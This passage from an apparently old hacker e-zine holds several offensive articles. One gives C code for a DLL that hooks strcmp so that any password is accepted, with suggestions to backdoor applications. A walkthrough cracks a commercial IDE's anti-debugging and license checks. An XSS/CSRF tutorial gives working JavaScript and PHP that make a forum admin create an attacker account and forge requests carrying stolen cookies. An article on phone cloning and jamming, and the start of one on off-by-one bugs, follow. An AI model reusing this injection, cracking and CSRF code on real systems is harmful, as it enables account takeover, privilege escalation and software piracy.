    DWORD calc = ((DWORD)Function - addr - 5); //((to)-(from)-5)
    memcpy(&jmp[1], &calc, 4); //build trampoline
    WriteProcessMemory(GetCurrentProcess(), (void*)addr, jmp, 6, 0); 
    // write the 6 bytes long trampoline to address of hooked function to
current process
	return addr;
}

This function resolves the address of the function to be hooked, and builds a
trampoline as follows:

JMP <4 empty bytes for addres to jump to>
RETN

the address to jump to (the hook) is resolved like this:

((To)-(From)-5) == ((HookAddress)-(TargetAddress)-5)

the old address is backed up, to be able to unhook the function later (by
overwriting the trampoline with the original address).
Ok, now let's hijack our little app to make any password work:

int WINAPI strcmphook(const char* str1,const char* str2); // prototype

DWORD Faddr=0; // address
BYTE Fbackup[6]; // backup

DWORD InlineHook(const char *Library, const char *FuncName, void *Function,
unsigned char *backup)
{
	DWORD addr = (DWORD)GetProcAddress(GetModuleHandle(Library), FuncName); 
// Fetch function's address
	BYTE jmp[6] = {
                           0xe9,			  //jmp
		0x00, 0x00, 0x00, 0x00,  //address
		0xc3                                // retn
                                     };
          ReadProcessMemory(GetCurrentProcess(), (void*)addr, backup, 6, 0); 
// Read 6 bytes from address of hooked function from rooted process into backup

    DWORD calc = ((DWORD)Function - addr - 5); //((to)-(from)-5)
    memcpy(&jmp[1], &calc, 4); //build trampoline
    WriteProcessMemory(GetCurrentProcess(), (void*)addr, jmp, 6, 0); 
    // write the 6 bytes long trampoline to address of hooked function to
current process
	return addr;
}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
  switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls((HMODULE)hModule); //keeps it from being
re-called        
		Faddr = InlineHook(""ntdll.dll"",""strcmp"",strcmphook,Fbackup); // strcmp
in ntdll.dll
		return true;
	}break;
	case DLL_THREAD_ATTACH: break;
	case DLL_THREAD_DETACH: break;
	case DLL_PROCESS_DETACH:
	{
		WriteProcessMemory(GetCurrentProcess(), (void*)Faddr, Fbackup, 6, 0); //
restore address		
	}break;
  }
  return true;
}

int WINAPI strcmphook(const char* str1,const char* str2)
{
return 0; // always return 0, no matter what password was.
};

Once we inject this DLL into our victim app like this:
InjectDLL(""Victim.exe"",""hijack.dll""), you will notice that it doesn't matter
what password you supplied as a commandline argument, you will always get the
""Accepted"" messagebox. As you can see process Hijacking can get you many things.
You could subvert an application to elevate your privileges, create an extra
account, download & execute an app with the privileges under which the app runs,
you could even backdoor the app itself by letting it execute code to run the DLL
injector @ startup, thus effectively taking over the app.

Act VI:
Difficulity: Hard
Tools: OllyDbg,PEiD,DeYoda (found here: http://xtaz3k.free.fr/decryptors/Dy.ace)
Objective: Get the MessageBox with the password to popup (the password IS
encrypted and is not to be found in plaintext in the app,
you can also decrypt the password by hand since the 'encryption' is pathetic,
but that way you'll miss some valuable knowledge)

Ok, there is this new IDE, called BulkIDE, you really wanna get your hands on,
it is said to be quite nice, but the price tag is a 'little' high, $3000,
outrageous for such a simple IDE, so let's crack the bitch. You managed to lay
your hands on the main installer executable, but you seem to be missing the
installation CD, but hey, we should get this working without that stupid license
.exe :) It is rumored though that the programmers behind this IDE are fans of
""security through obscurity"" meaning we can expect a lot of opaque predicates (a
function that evaluates to true or false and of which the outcome is known to
the programmer on forehand, sometimes used as useless code that seems important
or anti-debugging). 

First of all we load up PeiD and check the app, result:

yoda's cryptor 1.2

This is probably your first encounter with a packer/crypter. Many software these
days (especially commercial software and malware) is packed/crypted to make
reversing a tiny whiny bit harder and to reduce executable size.
Yoda's cryptor is quite a nice compressor/packer/crypter for PE files, but it
can be undone in a wink, just fire up DeYoda, load the app and GO! Fire up PEiD
again:

Nothing found *

Nice, that's what we wanna see. 

Now fire up OllyDBG and load the unpacked executable. 
We won't start looking at all strings, cause they are too obvious to be real
passwords, they're just bogus shit to confuse the cracker.
The first thing we see is:

00401000 >/$ 68 0A204000   PUSH unpacked.0040200A; /FileName = ""user32.dll""
00401005  |. E8 B5020000   CALL <JMP.&KERNEL32.LoadLibraryA>; LoadLibraryA
0040100A  |. 68 15204000   PUSH unpacked.00402015;ProcNameOrOrdinal =
""BlockInput""
0040100F  |. 50            PUSH EAX; |hModule
00401010  |. E8 92020000   CALL <JMP.&KERNEL32.GetProcAddress>;GetProcAddress
00401015  |. A3 24204000   MOV DWORD PTR DS:[402024],EAX
0040101A  |. 6A 01         PUSH 1
0040101C  |. FF15 24204000 CALL DWORD PTR DS:[402024]

Well, the following happens:

GetProcAddress(LoadLibrary(""user32.dll""),""BlockInput"") gets stored in DWORD PTR
DS:[402024]. BlockInput is a function to halt all keyboard and mouse input if
it's argument is true, and resume it if it is false. If we look a bit further,
at ox0040101A we see a call to BlockInput with a true parameter and at
0x00401048 we see it with a false parameter. So obviously the program attempts
to block any input during program execution to prevent debugging and reversing.
Well to get rid of this nuisance, we'll just nop those PUSH <true||false>
CALLDWORD PTR DS:[402024] structures out with right click -> binary -> fill with
NOP's. Then we have another IsDebuggerPresent call, just breakpoint the test
eax,eax after the call, set EAX to 0 and continue. 

00401030  |> 50             PUSH EAX
00401031  |. BE EC114000    MOV ESI,unpacked.004011EC                ;  Entry
address
00401036  |. B9 08000000    MOV ECX,8
0040103B  |. E8 1C010000    CALL unpacked.0040115C

Hmmm, what's this? Let's first take a look at unpacked.0040115C:

0040115C  /$ 33D2           XOR EDX,EDX
0040115E  |> 51             /PUSH ECX
0040115F  |. AD             |LODS DWORD PTR DS:[ESI]
00401160  |. E8 17000000    |CALL unpacked.0040117C
00401165  |. 03D0           |ADD EDX,EAX
00401167  |. 59             |POP ECX
00401168  |.^E2 F4          \LOOPD SHORT unpacked.0040115E
0040116A  \. C3             RETN

Ok, let's put it all in an ordered way:

 -)EDX is set to 0
 -)ECX is saved
 -)EAX is loaded from ESI
 -)unpacked.0040117C is called
 -)EAX (probably the result of unpacked.0040117C) is added to EDX
 -)ECX is restored
 -)This is looped

So this is an additive repeation of  unpacked.0040117C. Let's check
unpacked.0040117C out:

0040117C  /$ B9 20000000    MOV ECX,20
00401181  |> D1E8           /SHR EAX,1
00401183  |. 73 05          |JNB SHORT unpacked.0040118A
00401185  |. 35 2083B8ED    |XOR EAX,EDB88320
0040118A  |>^E2 F5          \LOOPD SHORT unpacked.00401181
0040118C  \. C3             RETN

Some people (Vxers, reversers and comp. Sci. Students) will recognize this as a
Cyclic Redudancy Check and that's what it is. A Cyclic Redudancy Check is a type
of hash function used to produce a checksum, in order to detect errors in
transmission or storage. Hmm so it seems unpacked.0040115C does an additive CRC
over ECX bytes, to calculate the CRC checksum of the code area unpacked.004011EC

and the next 8 bytes. This is obviously to check if the cracker made any
modifications (breakpoints, nops,etc) to this code area. Now let's check what
this area is all about:

004011EC  /$ 6A 00          PUSH 0
004011EE  |. 68 0D124000    PUSH unpacked.0040120D ;  ASCII ""DAEMON""
004011F3  |. 64:67:A1 3000  MOV EAX,DWORD PTR FS:[30]
004011F8  |. 0FB640 02      MOVZX EAX,BYTE PTR DS:[EAX+2]
004011FC  |. 0AC0           OR AL,AL
004011FE  |. 74 02          JE SHORT unpacked.00401202
00401200  |. EB 04          JMP SHORT unpacked.00401206
00401202  |> 33C0           XOR EAX,EAX
00401204  |. C9             LEAVE
00401205  |. C3             RETN
00401206  |> B8 01000000    MOV EAX,1
0040120B  |. C9             LEAVE
0040120C  \. C3             RETN

Hmm, more experienced crackers will recognize this as a common trick to detect
OllyDBG. To circumvent this we don't need to modify this section at all, we just
need the Olly-Invisible plugin. Now, back to where we were, 0x0040103B. It seems
the result of this check, along with the result of a call to 0x004011EC (the
ollyDBG detection function) is stored in EDX and then 0x00401057 is called. Now
we need to watch out since we are gonna be stuffed with Opaque predicates. All
shit is bogus until this piece of code:

00401076  |. 68 06204000    PUSH unpacked.00402006 ; /RootPathName = ""E:\""
0040107B  |. E8 2D020000    CALL <JMP.&KERNEL32.GetDriveTypeA>; \GetDriveTypeA
00401080  |. 83F8 05        CMP EAX,5

Here the DriveType of E:\ is determined (since this is a test program not all
drives are enumerated but E:\ is assumed as the CD-ROM drive, whatever since we
don't have the installation CD it doesn't matter :D) and then it is checked if
E:\ is a CD-ROM drive (5 being DRIVE_CDROM). The next important call is a call
to GetVolumeInformationA, that will retrieve the CD-Serial in unpacked.00402020.
As we can see here: 
004010A6  |. 813D 20204000 >CMP DWORD PTR DS:[402020],DEADBEEF

the serial is expected to be 0xDEADBEEF. Since we don't have the CD, we'll nop
out the conditional jump right after the CMP (it's a JNZ jump, meaning the
serial was invalid and only nasty stuff can happen afterwards so...). Now
0xDEADBEEF is stored in EDX (or at least, we store it there >:p) and a call to 
unpacked.004011A1 is made, which seems to be a decryption function based on this
piece of code:

004011C6  |. B9 03000000    MOV ECX,3
004011CB  |. BE 92124000    MOV ESI,unpacked.00401292                ;  ASCII
""es`""
004011D0  |. 8BFE           MOV EDI,ESI
004011D2  |> AC             /LODS BYTE PTR DS:[ESI]
004011D3  |. 34 32          |XOR AL,32
004011D5  |. AA             |STOS BYTE PTR ES:[EDI]
004011D6  |.^E2 FA          \LOOPD SHORT unpacked.004011D2

What we see here is interesting too:

004011A1  /$ E8 1F010000    CALL <JMP.&KERNEL32.GetTickCount>        ;
[GetTickCount
004011A6  |. 8BD8           MOV EBX,EAX
004011A8  |. CC             INT3
004011A9  |. E8 17010000    CALL <JMP.&KERNEL32.GetTickCount>        ;
[GetTickCount
004011AE  |. 2BC3           SUB EAX,EBX
004011B0  |. 3D 58270000    CMP EAX,2758

A call to GetTickCount (Function that retrieves the number of milliseconds that
have elapsed since the system was started) is made, then INT3 is called and
another call to GetTickCount is made, the results being substracted (EAX thus
holding the difference). The interesting thing is INT3, INT3 is a breakpoint,
thus halting the debugger and pausing the run of the app. You already feel it
coming eh? Because a normal run of the app with a correct CD in the CD-drive
would go fine (without CD the app would get lost in invalid,buggy and useless
Opaque predicates) and smooth (INT3 doesn't break the app when not being
debugged) the difference between the first and second GetTickCount would be
nihil, but when debugging you either need to react very very fast (I gave you
more time with 2758 milliseconds than most apps that use this trick) or just nop
the shit out (providing you don't spot any nasty CRC tricks on that code ). For
those that think ""TO HELL, NOP THOSE CRCs OUT TOO! FUCK YEAH!"", those CRCs could
actually be used as an arithmetic parameter to a string decryption function.
Well, to counter this, we would just fire up the debugger, run it check the CRC
of the non-modified piece of code, note it restart all shit, modify the code and
feed the good CRC to the decryption function, but that is another story. Then
this function is called:

0040118D  /$ AC             LODS BYTE PTR DS:[ESI]
0040118E  |. 3D CC000000    CMP EAX,0CC
00401193  |. 75 06          JNZ SHORT unpacked.0040119B
00401195  |. B8 01000000    MOV EAX,1
0040119A  |. C3             RETN
0040119B  |> B8 00000000    MOV EAX,0
004011A0  \. C3             RETN

apperently a check if the breakpoint is left intact <.< A pathetic attempt,
since we'll just manipulate the register holding the result (EAX). Now we
continue and voila! We get the popup with the password: WAR.

Afterword:

Well, this was just the top of the iceberg, letting you taste the 'forbidden
fruit' of reverse engineering, a most enjoyable and profitible practice, usefull
for crackers,vxers and exploit developpers alike. There are many,many more ways
for a programmer to protect his program from being cracked. The programmer could
also make his program decrypt @ runtime (much like a virus) when the correct key
is provided, but a reverse-engineer could whipe out the key-checking procedure
with nop's (0x90) or turn the conditional jump after the key-checker into an
unconditional one. He could make the app run in ring-0 but then we could use
soft-ice to debug the app. The programmer could use rootkit techniques to hide
his app from userland and kernelland, but then we could use the same techniques
as rootkitdetectors.
As you can see, there are endless amounts of ways to protect a program ... but
even more to break it :D. I hope you enjoyed reading this article, I certainly
enjoyed writing it and remember kids, don't let copyrights on shit products stop
you, but give credit where credit is due!

Outro:

Greets and shouts go to HTS (zine staff) members, ASO members, VX.netlux
members, .aware crew,RRLF, reversing.be (hagger in special for being such a
fucking good reverser) and IRC dudes.

################################################################################
#                       'Advanced' Cross-Site-Scripting                        #
################################################################################
by r0xes

There are probably thousands of XSS papers, articles, and the like stored on
someone's server or blog. Unfortunately, there are not so many that cover any
advanced topics, such as using AJAX for CRSF, using PHP for CRSF, abusing
embedded script already on the page...

The point of this article is to shed a brighter light on such topics. I'm going
to try to go in-depth without actually falling into a bottomless pit, as it is
often that you are in a different situation and with a different attack
vector..big attacks are hardly ever the same.

Some terminology notes before we begin...
	AJAX - Asychronus JavaScript and XML - Allows an update/sending of data
without having to refresh a page, or a part of a page, etc..
		
	CRSF - Cross-Site-Request-Forgery - Mostly like the opposite of generic XSS
- in a sense that instead of exploiting the user's trust in a website, you
exploit the website's trust in a user.

/~CONTENTS
	\x01 - Using AJAX for CRSF.
	\x02 - Using PHP for CRSF.
	\x03 - Minor Bullshit.
	
	\x01: Using AJAX for CRSF
  There are (now) quite a few good examples and hundreds of big-time web apps
that use AJAX to import nice effects and cool stuff to their page. Very few
things tell you how to use it for things deemed 'bad'. However, there have been
2 things I think are great examples of using it for misdeeds..
  [1] MySpace 'samy is my hero' Worm
  [2] CriticalSecurity.NET 'I love IceShaman' Script
  Firstly, the I say number one is a worm. It is such because it replicated
itself to a user's profile when they visited. Unfortunately (even though it hit
over 1mill users) it didn't work as fast as it could have, because it used
Internet Explorer's dumb 'feature' of executing JavaScript in CSS. The code to
this can be found by going to http://namb.la/.
  The second one is a script (only) because it did not replicate itself into a
user's anything. It is a good example, however. You can find the code to this by
asking IceShaman on irc.hackthissite.org.
  Anyway, these are only meant so you can take a look at them. Now, we'll wander
through some code and technical mumbo-jumbo....To start, we need to know how to
call the XMLHttpRequest Object. There are many ways of calling the object, but
we'll just use a 'foolproof' method. Not all browsers support this object, but
almost any new-age browser supports it.

  var http_request = false;
  if (window.XMLHttpRequest) {
  // This is the way to ask for the XMLHttpRequest
  // object in Mozilla, Safari, etc;
  http_request = new XMLHttpRequest();
  if (http_request.overrideMimeType) {
    // Some versions of Mozilla get ..pissy..when the mimetype isnt xml
     http_request.overrideMimeType('text/xml');
   }
 } else if (window.ActiveXObject) {
   try {
     // IE has 2 different ways (versions of IE)
     // of getting the XMLHttp object.
    http_request=new ActiveXObject(""Msxml2.XMLHTTP"");
   } catch (e) {
     try {
     http_request = new ActiveXObject(""Microsoft.XMLHTTP"");
     } catch (e) {
    }
  }
}
if(!http_request){
  // browser doesn't support the object..
  alert('browser needs to DIE.');
}
      
  It all may seem like a rush to you, but it is very simple. We're just checking
what way we need to call the object. Since Internet Explorer is completely
retarded, it has different ways to call it depending on the version. If it can't
get the object at all, then it gives you an alert. For the sake of usablility,
we'll import this and everything we need into a function. This function will be
able to send POST requests, and thus GET variables.

  [code]
var http_request = false;
function doPost(url, parameters) {
  http_request = false;
  if (window.XMLHttpRequest) {
  // This is the way to ask for the XMLHttpRequest
  // object in Mozilla, Safari, etc;
  http_request = new XMLHttpRequest();
if (http_request.overrideMimeType) {
  // Some versions of Mozilla get ..pissy..when the mimetype isnt xml
  http_request.overrideMimeType('text/xml');
  }
} else if (window.ActiveXObject) {
  try {
  // IE has 2 different ways (with different versions of IE) of getting the
XMLHttp object. The next two are these
  http_request=new ActiveXObject(""Msxml2.XMLHTTP"");
  } catch (e) {
    try {
      http_request = new ActiveXObject(""Microsoft.XMLHTTP"");
    } catch (e) {  }
  }
           }
           if (!http_request) {
           // either the browser is too old, doesn't support this, etc
            document.write('hono!');
            return false;
           }
           http_request.onreadystatechange = callBackFunc;
           // We open link to our url
           http_request.open('POST', url, false);
           // The next 3 setRequestHeader()s are so we can use POST correctly
           http_request.setRequestHeader(""Content-type"",
""application/x-www-form-urlencoded"");
           http_request.setRequestHeader(""Content-length"", parameters.length);
           http_request.setRequestHeader(""Connection"", ""close"");
           // Ok, send our shit now :-)
           http_request.send(parameters);
           }
           function callBackFunc() {
            if (http_request.readyState == 4) {
                if (http_request.status == 200) {
                    return true;
                } else {
                    return false;
                }
             }
           }
If you need to only send GET parameters, you would use the function like so:
doPost('file.ext?get=vars', '');
This code with no extra whitespace that you can link to is located at
http://dynxss.whiteacid.org/x.js.
  
Okay, so we've got our object working, and we want to start doing some really
cool stuff, like making the admin create a new unrestricted account for you,
right? Now it's time for a 'case study'. This is just a simple one, _very_
simple.

FlexBB 0.5.5b cleaned new posts extraneously, but it didn't even check user's
signatures. It was possible to inject any code you wished, from 'defaces' to
full-blown 'you have been logged out, please log in' screens. So, I took a quick
look at the administration panel and figured out what I needed to create a new
administrator account. Luckily, since FlexBB is still in development, I didn't
have to parse for any hashes or anything.
  So I had to send 5 variables. A username, the password, password check, email,
and the level of access. I want admin, of course. But what happens when the
admin views this again? It will just keep 'attempting' to create the same user
over and over... We could either use some random name making function or use an
off-site list. Just so I didn't have to write even more code, I just decided to
use 'Math.floor(Math.random()*(n+1)'. So, I'd put something like:
  var name = 'blah'+Math.floor(Math.random()*(n+1));
And I'd usually have a new name every time. Most likely the administrator will
notice this, so we could write a function that is called before the user is
created to check if an account has already been created with a specific name,
but we're doing this quick here. Anywho, so our code in our signature would look
like:
  <script src=""http://mysite.org/lib.js""></script>
  <script>var
name='blah'+Math.floor(Math.random()*(n+1));doPost('flexbb/admin/users.php?com=
addmember&do=addmember2',
'&username='+name+'&password=fuyck&password2=fuyck&email=fuck@dude.org&position=
4');</script>
  
\x02 Using PHP for CRSF.
I know you're thinking I'm weird at this point, but it can be done. All you
really need is a host that supports PHP.
The best thing about this is that it can be used with just a simple redirect
from one page. So imagine that you link to an 'image' file that
is really just a masked PHP file. It executes with either predefined intent or
dynamic uses by GET variables.
[1]. Predefined/Static.

<?php header(""Location: http://www.somesite.org/index.php?act=deluser&id=1""); ?>

[2]. Dynamic (call by something like <img
src='http://mysite.org/img.jpg?s=site.org&p=ucp.php&g=op:edprof,content:i
m%20so%20dumb'>)         (seems a bit complicated? lol.)

$site = $_GET['s']; $page = $_GET['p']; $vars = $_GET['g']; $realvars =
explode(',', $vars); foreach($realvars as $rv){ $x = explode(':', $rv); $snd .=
'&'.$x[0].'='.$x[1]; } header(""Location: "".$site.""/"".$page.""?"".$snd);
Also, if you can send along document.cookie, you could do something like:
$out = ""POST $page HTTP/1.1\r\n""; $out .= ""Host: $host\r\n""; $out .= ""Cookie:
$cookie\r\n""; $out .= ""User-Agent: $useragent\r\n""; $out .= ""Content-length:
"".(strlen($data)).""\r\n""; $out .= ""Connection: Close\r\n""; $out .=
""Content-Type: application/x-www-form-urlencoded\r\n\r\n$data""; $fs =
fsockopen($site, 80, $errno, $errstr, 0); fwrite($fs, $out); fclose($fs);

Although these are not really practical approaches, as in the first example you
cannot automate POST data, and the second will be defeated if the remote server
checks IP addresses (which isn't very common except among the likes of banks and
such.)

\x03 Minor Bullshit
There are many XSS attacks that happen every day. Most are unsuccessful, because
they are just simple techniques that are extremely noticeable. Most of the time
this is either blatant stupidity, or the nature of the attack leaves it in plain
sight. This is a big problem, because we don't want the administrator to notice
some wierd-ass fuckup on a page he's visiting, and look too much into it.

################################################################################
#                              Cellular Surpises                               #
################################################################################

So You Missed the Wireless Revolution?

Everyone is familiar with cellular phones and has at some point used a cellular
phone. Most people in so-called civilized countries own cell phones and use them
regularly. With such a widespread use there arise certain individuals who sport
interest in pushing these phones and their providers to their ultimate
limitations and asking that god-forsaken question: ""Just what can you do with a
cell phone?""

With their momentous rise in popularity, cell phone providers are forced to
think of new and unique options for their phones; what started out as a wireless
utility for connecting individuals has evolved and been given new functions like
organizers, gaming, text messaging, picture taking and built in cameras, ring
tone downloading and much, much more. Indeed, with the apple iPOD compatible
phone, recently developed by Apple and Motorola, the future looks bright for
this industry. The phone companies give so many options to phone users, most
users don't even realize that the phone may have abilities they are unaware of,
menus that could change the phone's functioning, passwords that would let them
change their number to whatever they want at any time. Fortunately, cellular
entrepreneurs who realize the value of this information provide it in numerous
online references.

When you get a cell phone, you're going to have a wireless cellular provider.
Now, don't get the wireless provider confused with the phone's maker. You may
have a Nokia or Motorola, but your wireless provider could be Sprint, or worse
yet, T-Mobile. Although T-Mobile does have decent roaming partners in terms of
GSM. Just what are roaming partners? Well, we've got to understand what roaming
is first. Now, let's say that my home service area is the state I live in. If I
were to go to say, Hawaii, I would no longer be in my home area. I would be
roaming. When I'm roaming, I may be charged more for my calls. How do I know my
home area? It'll be listed in the phone plan. There is no set distance that a
home area covers. It can be a city, a state, the whole country. Your home area
is defined by whatever rate plan you use. That rate plan will also define your
roaming charge. Sometimes you'll need to pay a bit extra, other times the
provider just won't have a roaming charge. Providers will always try to get a
wide network of roaming partners. If I go to France, my provider may not cover
that area. If the provider has no roaming partners in France, I'm out of luck, I
won't get any service. However, if my provider is say, T-Mobile, I will be
perfectly fine. They have a partnership with Bouygues Telecom, a French provider
with national coverage.

Well, what is it that makes a cell phone unique? In addition to its phone number
(MIN) each phone has its own electronic serial number (ESN), factory set on
every phone. It's engraved into a memory chip called Programmable Read Only
Memory (PROM), Erasable Programmable Read Only Memory (EPROM), or Electronically
Erasable Programmable Read Only Memory (EEPROM). EPROM and EEPROM are the most
commonly used. To find your ESN, either take out your phone's battery, inside
there should be some sort of information sticker, called a compliance plate,
with your ESN listed or dial *#06#. If not, check for an International Mobile
Equipment Identity (IMEI) number. IMEI means that your phone is connected
through the Global System for Mobile Communications (GSM), which is quite
popular by the way, besides being the standard for Europe and Asia and owning
about 80% of the wireless market. Code Division Multiple Access (CDMA) is the
U.S. attempt at equaling GSM. There's an argument out there about which is
better, GSM or CDMA. It's a fairly interesting argument with good points on both
sides. GSM is used by companies like AT&T, Cingular and T-mobile, while CDMA is
favored by Verizon and Sprint; they're roaming partners, and Alltel. Some say
GSM has worse audio quality than CDMA, but that depends on a number of factors.
Personally, I prefer GSM, but it's your choice.

So anyway, back to ESN. The ESN is an 11 digit identification number format
xxxxxxxxxxx. That looks pretty ugly, so I'm going to cut it into 3 parts,
xxx-xx-xxxxxx. The first part is the manufacturer's decimal code. It's a 3 digit
code which tells you who made your phone. The next 2 digits are reserved. And
the last 6 digits are the phone's serial number (SNR) uniquely assigned to each
phone.

With GSM you have an IMEI code. An IMEI code is a unique 15 digit identification
number formatted: either xxxxxx-xx-xxxxxx-x or xxxxxxxx-xxxxxx-x depending on
the phone's production date, before or after January 1, 2003. The first 6/8
digits are the type approval/allocation code (TAC). This shows where the type
approval/allocation was sought for the phone. The first 2 digits in this number
represent the country code. I shouldn't need to say this, but just in case, the
country code is the same for both wired and wireless telecommunications. The
second group of numbers is the Final Assembly Code (FAC) and used to identify
the manufacturer.

However, a procedure set January 1, 2003 makes the FAC obsolete, setting it at
00 until April 1, 2004 when it is no longer included. Because of the new
procedure, the TAC was expanded to 8 digits. The third group is the 6 digit
Serial Number (SNR). Finally, the last group is the Check Digit (CD) used to
check the code for its validity. It's a checksum to prevent IMEI tampering. The
CD only applies to phones of Phase 2 and higher, Phase 1 GSMs have an automatic
0 for the CD. An International Mobile Equipment Identity and Software Version
(IMEISV) number is sometimes used. It gives you the phones original software
number by adding a 2 digit Software Version Number (SVN) at the end of the code.
So the number format is changed to xxxxxxxx-xxxxxx-x-xx.

Further information on your phone is contained in the Subscriber Identity Module
(SIM) card. The SIM card originally started out on GSM phones, but CDMA saw the
usefulness of the card and promptly began implementing it as well. GSM's cards
are still superior though. When you turn on your phone and try to access its
features too early, you may get a message like ""Reading SIM"", or if you dial a
number stored in your phonebook without going through the phonebook, it may not
list the name of the person you're calling. That's because phonebook information
such as numbers and missed calls is, usually by default, stored on your SIM.
Now, technically, SIM is not really the card itself. SIM refers to a Universal
Integrated Circuit Card (UICC) with an SIM application that stores phone numbers
and text messages. Among other things, it can also store memos and Internet
browser bookmarks for those with wireless Internet phone access.

The SIM card also contains several numbers that identify it and the customer
that uses it. First is the International Mobile Station Identity (IMSI) number.
The IMSI number is a unique 15 digit identification number that identifies GSM
and Universal Mobile Telecommunications System (UMTS) network mobile phone
users. UMTS is a third generation mobile phone system, as apposed to GSM which
is second generation. Originally, UMTS phones were incompatible with GSM but as
of 2004, UMTS phones have been dual UMTS/GSM, allowing them to continue
functioning in a UMTS unsupported area. UMTS has also been called W-CDMA, this
isn't exactly true since UMTS only uses W-CDMA's air interface, transmission
between phones and towers, while using GSM's Mobile Application Part (MAP) core,
the protocol providing mobile functions like call routing and GSM's speech
codecs. The equivalent of the SIM on UMTS is the USIM or Universal Subscriber
Identity Module.

Don't go getting the IMSI and the IMEI confused. They're both 15 digit
identification numbers, however, IMEI is for your phone, and IMSI is for your
SIM. The IMEI will be printed on an information sticker under the battery of
your phone, and you can also bring it up by using the standard IMEI code *#06#.
The IMSI will be printed on your SIM card. Often the formatting will be
xxxxxxxxxxxxxxx. Like the IMEI, this number can be taken apart. If we divide it
into portions, the formatting becomes xxx-xx(x)-xxxxxxxxx(x). Why are an x in
part two and an x in part three in parenthesis? The first set of three digits is
your Mobile Country Code (MCC). There is a special set of IMSI specific country
codes. The next set can be either two or three digits, depending on where you
live: two digits in Europe, three in North America. This is the Mobile Network
Code (MNC) which tells you what mobile network you're using. The final set which
can be nine or ten digits is the Mobile Station Identification Number (MSIN)
which uniquely identifies you as a network's subscriber.

The MCC and MNC come together with the Local Area Code (LAC) to form the
Location Area Identity (LAI). Before we can talk about LAIs we have to define
one more term, that being the Public Land Mobile Network (PLMN) or just GSM
phone network. The information transmission for cellular phones is focused
around cellular towers, which of course use radio waves. PLMNs refer to all
wireless networks that use radio transmission involving land based radio
transmitters or radio base stations, so wireless phone services, wireless
internet services, and so on. An LAI is an identifying code transmitted from all
cellular towers that allows a cellular phone to select the tower with the
strongest signal. You might have a single signal bar showing on your phone, and
suddenly it jumps to five. Your phone just switched to a different network with
a stronger signal.

The last thing I'll mention relating to SIMs is the International Circuit Card
ID (ICCID), which is a number that identifies your UICC.

On a final note, what if my antenna signal is low, a one for example, and my
phone just won't switch networks. For a while now, a bunch of companies have
been selling little golden circuit stickers that you can attach to the inside of
your phone, under the battery, and ""boost your antenna signal"". These boosters
sell for around $20 in stores and they are bogus, they are a piece of trash and
a waste of money. The older ones are rectangular; I know Just Wireless is coming
out with little square ones now because the old ones are too big to fit on
practically all the flip phones. Adding a little golden circuit sticker to the
inside of your phone will in no way boost your antenna signal; it's just some
stupid money making scam that you should under no circumstances fall for. If
your antenna signal is extremely low and you're moving, it should rise within a
few minutes. If not you can always manually change networks; most phones have an
option that allows you to search for available networks and select one yourself.

With so many people using cell phones, naturally there are people who want to
push the limits of cellular law with a number of inventive ideas. Now, I'm just
going to mention these applications, not go into detail on them. First we have
scanners, largely considered either a load of fun or unlawful under the
Electronic Communications Privacy Act. What are scanners? Plain enough, scanners
let you listen in on other conversations. You can buy scanners for ridiculous
prices, usually hundreds of dollars, or you could just make your own with one of
several old cell phone models. Next, we have cellular cloning. Cloning makes it
so one phone mimics another. By copying a phone's MIN and ESN you can clone it.
Say I copy the ESN and MIN of phone A to phone B. Then phone B will ring when
phone A rings, and all charges from phone B will be billed to phone A allowing
me to make free calls while someone else pays the bills. The phone's ESN and MIN
are stored in the Number Assignment Module (NAM). The NAM will be a PROM, EPROM
or EEPROM chip; you guess which is easiest to clone. Next, let's mention
unlocking. This is probably the most common thing people do to cell phones. When
a cell phone is locked it means you can only use it with a certain wireless
provider's SIM cards. To unlock the phone you have to enter a code, the code
varies from phone to phone. Usually you can just call up your provider and ask
them for the unlock code, but you can also find them in a variety of online
publications. On another note, you remember those menus I mentioned at the start
of the text? Well, they certainly exist. Each phone has at least one menu that
contains anything from pixel tests to security settings specifically for
wireless providers, not consumers. These menus can be accessed by entering menu
code, which like the unlock code, varies from model to model. Finally, we've got
cell phone jammers. This is a cellular DoS attack on a surrounding area. Cheaper
jammers can be set to a certain frequency; the more expensive ones operate on a
range of frequencies. By emitting a signal on the same frequencies as analog and
digital cell phones, the signals are effectively canceled out. Did I mention
that scanning, cloning and jamming are illegal?

A complete works cited for this article is available online. I'll include a two
useful links. First is GSM World at www.gsmworld.com. The format of this site is
really nice, my favorite part of this site is GSM Roaming, which shows you
roaming information for any GSM provider in any country in the world, it's great
if you travel a lot and need reliable roaming coverage. Second, Cell Reception
over at www.cellreception.com. They've got the lowdown on all the latest phone
models and a listing of cellular phone towers anywhere in the US. They also have
a listing of cellular dead spots which are areas with no service usually due to
Mother Nature, not cell phone jammers.

Peace, ~Br0kenKeychain~

################################################################################
#                            Exotic Vulnerabilities                            #
################################################################################
(code and other files associated with nomenumbra's article are located at
http://www.hackbloc.org/zine/vivalarevolution.rar - pass is 'anarchism')

Intro:
Well, this small paper will be discussing two exotic vulns that are getting more
and more common, or actually more common knowledge. When b0fs where starting to
hit the scene back in the days of Aleph1 they were extremely common in most apps
(and still are in some), but more and more coders are getting aware of these
security risks and are doing boundschecking and are taking other measures. Well,
these 'protections' can often be circumvented in very silly ways, trough often
neglected and misunderstood bugs. I will be discussing off-by-one errors and
integer overflows in this paper.

Off-by-one errors:
I'm discussing off-by-one errors here, for those who don't know what an
off-by-one error is, here is a short description from wikipedia:

""An off-by-one error in computer programming is an avoidable error in which a
loop iterates one too many or one too few times. Usually this problem arises
when a programmer fails to take into account that a sequence starts at zero
rather than one, or makes mistakes such as using ""is less than"" where ""is less
than or equal to"" should have been used in a comparison.""

Example:
Imagine the coder would want do preform an action on elements m to n of an array
X, how would he calculate how many element would he have to process? Some would
answer n-m, which is ...
WRONG. This example is known as the ""fencepost"" error (the famous maths
problem). The correct answer would be n-m+1. See the following code:

for(int i = 0; i < (n-m); i++)
DoSomething(X[i+m]);

the coder might think he would preform the action over elements m to n of X but
actually he preforms them over m to n-1.

So it's actually the result of a shit-ass coder? Well, it is, but an off-by-one
bug is made more often than you think. Often hidden deep within a vulnerable
app, and not quite as obvious as the given examples. The following app is an
example (totally useless) app that features 3 vulns that can, when combined,
lead to system compromise.

#include <cstdlib>
#include <iostream>
#define UserCount 2

using namespace std;

struct UserStruct {
char* Username;
char* Password;
int Access;
}; // lame 'user' structure

UserStruct UserArray[UserCount]; // array

